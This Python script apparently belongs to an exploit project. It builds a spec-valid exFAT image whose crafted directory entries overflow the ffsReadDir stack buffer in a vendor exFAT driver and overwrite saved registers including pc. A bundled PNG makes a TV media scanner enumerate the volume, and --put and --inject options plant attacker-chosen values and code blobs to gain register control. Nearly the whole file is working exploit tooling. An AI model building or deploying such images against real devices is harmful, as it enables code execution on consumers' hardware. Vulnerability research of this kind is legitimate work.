#!/usr/bin/env python3
"""Build a valid exFAT filesystem image from scratch.

No mkfs dependency, no binary patching: every structure — boot region,
checksums, FAT, allocation bitmap, up-case table, root directory and the
crafted file set — is generated from first principles and internally
consistent. The volume mounts, lists and reads like any other exFAT volume;
the only unusual thing about it is one directory whose extended entries drive
the ffsReadDir copy loop past the caller's frame
(findings/exploit-004-exfat-numext.md).

Everything here follows the vendor driver's own parse paths
(vendor/exfat/exfat.c, 1.1.11p1):

  * PBR signature 0xAA55 (exfat.c:247); BPB = 109 bytes with a 53-byte
    MustBeZero at bpb[0..52] (PBR_SECTOR_T, exfat.h:212).
  * num_fats sits at absolute boot-sector byte 110 (BPB byte 99 after the
    11-byte jump/OEM prefix), followed by drive-select and percent-in-use.
    Bytes 113..119 are reserved and remain zero; libblkid rejects the volume
    if duplicate pseudo-fields are written there.
  * Up-case verification is content AND checksum driven (exfat.c
    __load_upcase_table): entries are u16 values tracked by `index`;
    identity advances, 0xFFFF starts a skip marker whose next u16 is the
    run length, anything else is a mapping. The load only succeeds when
    index reaches >= 0xFFFF and the running byte-checksum matches the
    entry checksum; any mismatch makes the driver fall back to its built-in
    table (harmless, but we build the real thing).
  * File-set checksum: calc_checksum_2byte(CS_DIR_ENTRY) — rotate-left-16,
    add byte, bytes 2..3 of the FILE entry skipped entirely.
  * The copy primitive: for i in 1..num_ext-1 the driver copies 15 raw u16
    from name entry i into uniname + 15*i. From byte 520 that buffer overlaps
    ffsReadDir's saved registers (uniname = fp-560; saved r4@+520, sp@+552,
    pc@+556), so the halfwords chosen here are ordinary filename content.

Usage:
  python3 tools/mk_trigger.py OUT.img [--size-mb 8] [--cluster-sectors 1]
      [--label TRIG] [--num-ext 20] [--entries 19]
      [--pattern offs16|ascii|cN]
      [--put OFF:VAL32 ...]   # force LE32 at payload byte offset OFF
      [--puth OFF:VAL16 ...]  # force u16 at payload byte offset OFF
"""
import argparse
import base64
import struct

SECTOR = 512
DENTRY = 32
# Valid 1x1 PNG; a recognizable p1 media file forces the TV media scanner to
# enumerate root, which is the exact operation that reaches ffsReadDir.
PROBE_PNG = base64.b64decode(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=")


def rot_add32(chk: int, byte: int) -> int:
    """One step of the driver's byte checksum (exfat.c __load_upcase_table):
    carry into bit 31, shift right, add byte."""
    return ((0x80000000 if chk & 1 else 0) + (chk >> 1) + byte) & 0xFFFFFFFF


def byte_checksum(data: bytes, skip: tuple = ()) -> int:
    """exfatprogs boot_calc_checksum(): per-byte rotate-right + add.
    The main boot sector skips bytes 106, 107 and 112 (its own fields that
    can change after the checksum is computed, per exfatprogs)."""
    chk = 0
    for i, b in enumerate(data):
        if i in skip:
            continue
        chk = rot_add32(chk, b)
    return chk


# the boot region (spec 3.9.2) and the up-case table (7.10.5) use the same
# per-byte algorithm; name them for clarity at each call site.
boot_checksum = byte_checksum
upcase_checksum = byte_checksum


def dir_checksum(set_bytes: bytes) -> int:
    """calc_checksum_2byte() with CS_DIR_ENTRY semantics (exfat.c):
    rotate-LEFT-16 + byte per byte; for the first 32 bytes (the 0x85 FILE
    entry) bytes 2..3 are skipped completely (no rotation either)."""
    chk = 0
    for i, b in enumerate(set_bytes):
        if i < 32 and (i == 2 or i == 3):
            continue
        chk = (((chk & 1) << 15) | ((chk & 0xFFFE) >> 1)) + b
        chk &= 0xFFFF
    return chk


def make_file_set(name: str, first_cluster: int, data_len: int) -> bytes:
    """Build a normal exFAT file-set (FILE + STREAM + one NAME entry)."""
    name = name.upper()
    encoded = name.encode("utf-16-le")
    if len(name) > 15:
        raise ValueError("probe filename must fit one name entry")
    fe = bytearray(DENTRY)
    fe[0] = 0x85
    fe[1] = 2                       # stream + one name secondary
    struct.pack_into("<H", fe, 4, 0x0020)  # archive
    for off in (8, 10, 12, 14, 16, 18):
        struct.pack_into("<H", fe, off, 0x5321)
    se = bytearray(DENTRY)
    se[0] = 0xC0
    se[1] = 0x03                    # allocation possible + no FAT chain
    se[3] = len(name)
    struct.pack_into("<H", se, 4, name_hash16(encoded))
    struct.pack_into("<Q", se, 8, data_len)
    struct.pack_into("<I", se, 20, first_cluster)
    struct.pack_into("<Q", se, 24, data_len)
    ne = bytearray(DENTRY)
    ne[0] = 0xC1
    ne[2:2 + len(encoded)] = encoded
    out = fe + se + ne
    struct.pack_into("<H", out, 2, dir_checksum(bytes(out)))
    return bytes(out)


def name_hash16(name_utf16le: bytes) -> int:
    """exFAT 7.2.6 NameHash (u16, rotate-right-16 + byte)."""
    chk = 0
    for b in name_utf16le:
        chk = (((chk & 1) << 15) | ((chk & 0xFFFE) >> 1)) + b
        chk &= 0xFFFF
    return chk


def folding(c: int) -> int:
    """Case folding used by the table (Basic Latin + Latin-1; complete for
    ASCII names, which is all a trigger volume's names ever contain)."""
    if 0x0061 <= c <= 0x007A:
        return c - 0x20
    if 0x00E0 <= c <= 0x00F6 or 0x00F8 <= c <= 0x00FE:
        return c - 0x20
    return c


def build_upcase_table() -> bytes:
    """Canonical-shape up-case table: covers 0x0 .. 0xFFFF with identity
    runs, skip markers (0xFFFF + run length) and the folding mappings.
    The driver requires the walk to reach index >= 0xFFFF, which a plain
    identity table of only 0x1000 entries cannot do — hence the runs."""
    out = bytearray()
    c = 0
    while c <= 0xFFFF:
        if c == 0xFFFF:                       # 0xFFFF is the skip marker itself
            out += struct.pack("<HH", 0xFFFF, 1)
            c += 1
            continue
        f = folding(c)
        if f != c:
            out += struct.pack("<H", f)
            c += 1
            continue
        run = 1
        while c + run <= 0xFFFF and folding(c + run) == c + run and c + run != 0xFFFF:
            run += 1
        if run == 1:
            out += struct.pack("<H", c)       # identity entry
            c += 1
        else:
            out += struct.pack("<HH", 0xFFFF, run)   # skip run entries
            c += run
    return bytes(out)


def build_payload(n_entries: int, pattern: str, puts32, puts16,
                  injections=(), zero_ok_injections=()) -> bytes:
    """The flat u16 stream the driver copies into uniname[0..]. Each 0xC1
    name entry contributes 15 raw u16 (30 bytes)."""
    n16 = 15 * n_entries
    vals = [0] * n16
    for k in range(n16):
        if pattern == "offs16":
            vals[k] = 0x8000 | (k & 0x7FFF)
        elif pattern == "ascii":
            vals[k] = 0x41 + (k % 26)
        elif pattern.startswith("c") and k >= 0 and pattern[1:] != "":
            vals[k] = int(pattern[1:], 0)
        else:
            raise SystemExit(f"bad pattern {pattern!r}")
    def put_val(off_bytes: int, val: int, width: int):
        idx = off_bytes // 2
        if off_bytes % 2:
            raise SystemExit("payload offsets must be even")
        if idx >= n16 or idx - 1 + width // 2 >= n16:
            raise SystemExit(f"payload offset {off_bytes:#x} beyond {n16*2:#x}")
        vals[idx] = val & 0xFFFF
        if width == 4:
            vals[idx + 1] = (val >> 16) & 0xFFFF
    for spec in puts32:
        o_s, v_s = spec.split(":")
        put_val(int(o_s, 0), int(v_s, 16), 4)
    for spec in puts16:
        o_s, v_s = spec.split(":")
        put_val(int(o_s, 0), int(v_s, 16), 2)
    def inject(spec, allow_zero=False):
        off_s, path = spec.split(":", 1)
        off = int(off_s, 0)
        blob = open(path, "rb").read()
        if off % 2 or len(blob) % 2:
            raise SystemExit("--inject offset and blob length must be even")
        if off + len(blob) > n16 * 2:
            raise SystemExit(f"--inject {path}: range exceeds payload ({n16*2:#x})")
        for i in range(0, len(blob), 2):
            val = struct.unpack_from("<H", blob, i)[0]
            if val == 0 and not allow_zero:
                raise SystemExit(
                    f"--inject {path}: zero halfword at blob offset {i:#x}; "
                    "use --inject-allow-zero only for a reviewed fragment terminator")
            vals[(off + i) // 2] = val
    for spec in injections:
        inject(spec)
    for spec in zero_ok_injections:
        inject(spec, allow_zero=True)
    return b"".join(struct.pack("<H", v & 0xFFFF) for v in vals)


class Volume:
    """Writes every byte of the volume. Clusters are allocated in order:
    root (2), bitmap (3), up-case chain (4..), then the crafted directory
    chain. The FAT and bitmap are patched in place as clusters are claimed."""

    def __init__(self, size_mb: float, spc: int, label: str):
        if spc < 1 or spc & (spc - 1):
            raise SystemExit("--cluster-sectors must be a power of two")
        self.spc = spc
        self.cluster_bytes = spc * SECTOR
        self.label = label[:11]

        boot = 24                                     # primary + backup boot regions
        self.total_sectors = max(1, int(size_mb * 2**20)) // SECTOR
        self.fat_off = boot
        # FAT length depends on cluster count, which depends on heap offset;
        # solve to a fixed point instead of using the old driver-only estimate.
        self.clu_count = (self.total_sectors - boot) // self.spc
        while True:
            fat_len = ((self.clu_count + 2) * 4 + SECTOR - 1) // SECTOR
            heap_off = self.fat_off + fat_len
            heap_off = (heap_off + self.spc - 1) & ~(self.spc - 1)
            clu_count = (self.total_sectors - heap_off) // self.spc
            if clu_count == self.clu_count:
                break
            self.clu_count = clu_count
        self.fat_len = fat_len
        self.heap_off = heap_off
        self.root_clu = 2
        self.serial = 0x19067299

        self.img = bytearray(self.total_sectors * SECTOR)
        self.next_clu = 2                             # clusters 2.. count up
        self.claimed = []                             # order of allocation

    # ---- low-level ---------------------------------------------------------
    def fat_put(self, clu: int, val: int):
        struct.pack_into("<I", self.img, self.fat_off * SECTOR + clu * 4, val)

    def clu_off(self, clu: int) -> int:
        return self.heap_off * SECTOR + (clu - self.root_clu) * self.cluster_bytes

    def claim(self, prev: int | None = None) -> int:
        """Allocate the next free cluster, chain it, zero it, mark it."""
        if self.next_clu >= self.clu_count + 2:
            raise SystemExit("volume too small for the requested layout")
        clu = self.next_clu
        self.next_clu += 1
        if prev is not None:
            self.fat_put(prev, clu)
        self.fat_put(clu, 0xFFFFFFFF)
        self.claimed.append(clu)
        o = self.clu_off(clu)
        self.img[o:o + self.cluster_bytes] = b"\x00" * self.cluster_bytes
        return clu

    def write_cluster_bytes(self, clu: int, off: int, data: bytes):
        o = self.clu_off(clu) + off
        if off + len(data) > self.cluster_bytes:
            raise SystemExit("cluster overflow")
        self.img[o:o + len(data)] = data

    # ---- boot region --------------------------------------------------------
    def build_boot_region(self):
        self.img[0:3] = b"\xeb\x76\x90"
        self.img[3:11] = b"EXFAT   "
        # MustBeZero: bytes 11..63 (already zero), then the BPB fields:
        struct.pack_into("<Q", self.img, 64, 0)              # volume offset
        struct.pack_into("<Q", self.img, 72, self.total_sectors)
        struct.pack_into("<I", self.img, 80, self.fat_off)
        struct.pack_into("<I", self.img, 84, self.fat_len)
        struct.pack_into("<I", self.img, 88, self.heap_off)
        struct.pack_into("<I", self.img, 92, self.clu_count)
        struct.pack_into("<I", self.img, 96, self.root_clu)
        struct.pack_into("<I", self.img, 100, self.serial)
        struct.pack_into("<H", self.img, 104, 0x0100)        # fs version 1.00
        struct.pack_into("<H", self.img, 106, 0x0000)        # volume flags
        self.img[108] = 9                                    # sector shift
        self.img[109] = self.spc.bit_length() - 1
        self.img[110] = 1                                    # number of FATs
        self.img[111] = 0x80                                 # drive select
        # percent-in-use (112) and reserved bytes 113..119 remain zero
        for i in range(0, 10):                               # 0..9 end in 0xAA55
            self.img[i * SECTOR + 510:i * SECTOR + 512] = b"\x55\xaa"
        # sectors 9 (OEM) and 10 (reserved) stay zero; they are no-ops for
        # the checksum (512 rotations = full circle), included for parity with
        # fsck/mkfs which verify all 11 boot sectors.
        chk = boot_checksum(self.img[:11 * SECTOR], skip=(106, 107, 112))
        self.img[11 * SECTOR:12 * SECTOR] = struct.pack("<I", chk) * (SECTOR // 4)
        # Backup boot region is an exact copy at sectors 12..23.
        self.img[12 * SECTOR:24 * SECTOR] = self.img[0:12 * SECTOR]

    # ---- root directory ------------------------------------------------------
    # ---- assembly --------------------------------------------------------------
    def build(self, num_ext: int, n_entries: int, pattern: str, puts32, puts16,
              injections, zero_ok_injections, dirnaam: str, probe_file=True):
        # claim order: root(2) → bitmap chain → up-case chain; the root cluster
        # chain is extended later if the file set needs more room. Content is
        # written once every cluster address is known.
        root_clu = self.claim()                       # cluster 2

        self.upcase_data = build_upcase_table()
        up = self.upcase_data

        bm_len = (self.clu_count + 7) // 8
        bm_first = self.claim()               # SEPARATE chain — root stays terminal
        self.bitmaps_chain = [bm_first]
        prev_bm = bm_first
        while bm_len > self.cluster_bytes * len(self.bitmaps_chain):
            nxt = self.claim(prev_bm)
            self.bitmaps_chain.append(nxt)
            prev_bm = nxt

        first_up = None
        prev = None
        src = 0
        while src < len(up):
            c = self.claim(prev)
            if first_up is None:
                first_up = c
            prev = c
            src += min(self.cluster_bytes, len(up) - src)

        # A real media object precedes the crafted set so the media indexer
        # has a reason to enumerate this partition.
        probe_set = b""
        if probe_file:
            probe_clu = self.claim()
            self.write_cluster_bytes(probe_clu, 0, PROBE_PNG)
            probe_set = make_file_set("PROBE.PNG", probe_clu, len(PROBE_PNG))

        # ---- root directory content ------------------------------------
        entries = bytearray()
        e = bytearray(DENTRY)                         # 0x83 volume label
        e[0] = 0x83
        e[1] = len(self.label)
        e[2:2 + 2 * len(self.label)] = self.label.encode("utf-16-le")
        entries += e
        e = bytearray(DENTRY)                         # 0x81 bitmap
        e[0] = 0x81
        struct.pack_into("<I", e, 20, bm_first)
        struct.pack_into("<Q", e, 24, bm_len)
        entries += e
        e = bytearray(DENTRY)                         # 0x82 up-case
        e[0] = 0x82
        struct.pack_into("<I", e, 4, upcase_checksum(up))
        struct.pack_into("<I", e, 20, first_up)
        struct.pack_into("<Q", e, 24, len(up))
        entries += e
        entries += probe_set
        fileset = None
        if num_ext >= 3:
            payload = build_payload(n_entries, pattern, puts32, puts16,
                                    injections, zero_ok_injections)
            fb = bytearray(DENTRY)
            fb[0] = 0x85
            fb[1] = num_ext & 0xFF
            struct.pack_into("<H", fb, 4, 0x0020)             # ATTR_ARCHIVE
            for o in (8, 10, 12, 14, 16, 18):
                struct.pack_into("<H", fb, o, 0x5321)         # timestamps
            sb = bytearray(DENTRY)                            # STREAM entry
            sb[0] = 0xC0
            sb[1] = 0x00                                      # no cluster content
            # name_len is a single byte (max 255 chars = 17 full windows).
            # windows beyond 17 only exist when num_ext-1 > 17 — there the
            # stream deliberately carries name_len=255 while more name entries
            # follow; the driver trusts num_ext and copies them all (the
            # found defect), and fsck flags the extra entries. That single
            # deviation is the trigger; everything else stays spec-valid.
            if n_entries <= 17:
                # decode the payload as a name, truncate at its terminator,
                # and keep name_len consistent with the content
                eff = 0
                for w in range(n_entries * 15):
                    if struct.unpack_from("<H", payload, w * 2)[0] == 0x0000:
                        break
                    eff += 1
                name_len = eff & 0xFF
            else:
                name_len = 255
                print("[!] deliberate deviation: name entries exceed name_len=255 "
                      "(required for register control); fsck will flag this")
            sb[3] = name_len
            struct.pack_into("<H", sb, 4, name_hash16(payload[:2 * name_len]))
            set_bytes = bytearray(fb) + bytearray(sb)
            for k in range(n_entries):
                ne = bytearray(DENTRY)
                ne[0] = 0xC1
                ne[1] = 0
                ne[2:32] = payload[k * 30:(k + 1) * 30]
                set_bytes += ne
            chk = dir_checksum(bytes(set_bytes))
            struct.pack_into("<H", set_bytes, 2, chk)
            fileset = bytes(set_bytes)

        if fileset is not None:
            entries += fileset

        chain = [root_clu]
        while (len(chain) * self.cluster_bytes) < len(entries):
            chain.append(self.claim(chain[-1]))
        pos = 0
        for clu in chain:
            take = min(self.cluster_bytes, len(entries) - pos)
            self.write_cluster_bytes(clu, 0, entries[pos:pos + take])
            pos += take

        # ---- up-case content -------------------------------------------------
        src = 0
        prev = None
        c = first_up
        while src < len(up):
            self.write_cluster_bytes(c, 0, up[src:src + min(self.cluster_bytes, len(up) - src)])
            src += min(self.cluster_bytes, len(up) - src)
            c += 1    # up-case chain was claimed contiguously

        # ---- bitmap content (after every cluster is claimed) ----------------
        bm = bytearray(bm_len)
        for clu in self.claimed:
            bm[(clu - 2) // 8] |= 1 << ((clu - 2) % 8)
        pos = 0
        for clu in self.bitmaps_chain:
            take = min(self.cluster_bytes, len(bm) - pos)
            self.write_cluster_bytes(clu, 0, bm[pos:pos + take])
            pos += take

        self.build_boot_region()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("out")
    ap.add_argument("--size-mb", type=float, default=8)
    ap.add_argument("--cluster-sectors", type=int, default=1)
    ap.add_argument("--label", default="TRIG")
    ap.add_argument("--num-ext", type=int, default=0,
                    help="secondary entries for the crafted file set (>=3 builds it)")
    ap.add_argument("--entries", type=int, default=None,
                    help="actual 0xC1 name entries laid down (default num_ext-1)")
    ap.add_argument("--pattern", default="offs16")
    ap.add_argument("--put", action="append", default=[],
                    help="OFF:VAL32 — force LE32 at payload byte offset OFF")
    ap.add_argument("--puth", action="append", default=[],
                    help="OFF:VAL16 — force u16 at payload byte offset OFF")
    ap.add_argument("--inject", action="append", default=[],
                    help="OFF:FILE — inject an even-sized blob; zero halfwords rejected")
    ap.add_argument("--inject-allow-zero", action="append", default=[],
                    help="OFF:FILE — reviewed injection where zero halfwords deliberately "
                         "terminate individual C1 fragments")
    ap.add_argument("--name-dir", default="d")
    ap.add_argument("--no-probe-file", action="store_true",
                    help="omit the valid p1 PROBE.PNG media file")
    a = ap.parse_args()

    n_entries = a.entries if a.entries is not None else max(0, a.num_ext - 1)
    v = Volume(a.size_mb, a.cluster_sectors, a.label)
    v.build(a.num_ext, n_entries, a.pattern, a.put, a.puth,
            a.inject, a.inject_allow_zero, a.name_dir,
            probe_file=not a.no_probe_file)
    open(a.out, "wb").write(v.img)
    print(f"wrote {a.out} ({len(v.img)//1024} KiB, clusters={v.clu_count}, "
          f"num_ext={a.num_ext}, entries={n_entries}, pattern={a.pattern})")


if __name__ == "__main__":
    main()
